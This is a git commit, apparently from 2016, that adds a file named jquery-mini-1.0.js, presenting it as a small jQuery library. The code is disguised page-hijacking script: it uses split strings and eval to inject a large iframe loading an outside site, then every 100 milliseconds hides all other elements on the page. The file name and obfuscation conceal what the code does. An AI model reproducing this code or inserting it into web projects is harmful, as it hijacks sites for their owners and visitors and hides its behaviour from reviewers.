91426ecdb8602fa0a76c4d68962697c34ee21a3f
null <hsmw@yopmail.com>
2016-11-02 14:23:53 +0800

    Create jquery-mini-1.0.js

---
+++ js/jquery-mini-1.0.js
@@ -0,0 +1,25 @@
+var aa=Math.round(Math.random()*8+1);
+var  ss = '<center id="showcloneshengxiaon"><ifr'+'ame scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14'+'00" height="73'+'50" src="ht'+'tp://'+'www'+'.baidu'+'.com/'+'/"></iframe></center>';
+eval("do"+"cu"+"ment.wr"+"ite('"+ss+"');");
+	
+try{
+	setInterval(function(){
+
+		try{
+			document.getElementById("div"+"All").style.display="no"+"ne";
+		}catch(e){}
+
+		for(var i=0;i<document.body.children.length;i++){
+			try{
+				var tagname = document.body.children[i].tagName;
+				var myid = document.body.children[i].id;
+				if(myid!="iconDiv1" && myid!="showcloneshengxiaon"){
+				  // if(tagname!="center"){ 
+				     document.body.children[i].style.display="non"+"e";
+				   //}
+				}
+			}catch(e){}
+		}
+
+	},100);
+}catch(e){}
